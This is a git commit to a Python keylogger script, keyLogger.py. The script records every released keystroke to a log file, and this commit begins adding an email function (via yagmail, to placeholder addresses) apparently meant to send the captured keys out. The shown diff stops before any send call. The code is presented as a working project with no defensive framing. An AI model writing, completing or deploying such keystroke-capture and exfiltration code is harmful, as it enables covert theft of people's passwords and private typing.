cac96317c7f9699d655e7243f35bfe7c2976504f
mSakib20 <msakib2022@fau.edu>
2023-08-09 14:21:35 -0400

    adding email service

--- keyLogger.py
+++ keyLogger.py
@@ -1,6 +1,8 @@
 import keyboard                 #import keyboard for listening to keystrokes
 import logging                  #imporet Logging for recording keystrokes
 import datetime                 #import Datetime to get time and date for keystrokes
+import time                     #
+import yagmail 
 
 log_file = "loggedKeys.log"     #creating a variable called log_file and assigning it the value "loggedKeys.log"
 logging.basicConfig(filename=log_file, level=logging.DEBUG) # Configuring basic logging settings, specifying the name of the log file and setting the logging level to DEBUG
@@ -15,4 +17,11 @@ def on_key_event(event):        #define a function called 'on_key_event' that ta
 
 keyboard.on_release(callback=on_key_event) #setting up a listener for key release events and calls the 'on_key_event' function every time a key is released
 
-keyboard.wait()                 #keep the script running
+#keyboard.wait()                 #keep the script running
+
+def send_email():               #defining a function called 'send_email'
+    
+    sender_email = 'example_S@gmail.com'                        #creating a variable called 'sender_email' and assigning it the value of the sender's email address
+    recceiver_email = 'example_R@gmail.com'                     #creating a variable called 'receiver_email' and assigning it the value of the receiver's email address
+    subject = 'Keylogger'                                       #creating a variable called 'subject' and assigning it the value of the subject of the email
+    body = 'This is an email sent by a keylogger'               #creating a variable called 'body' and assigning it the value of the body of the email
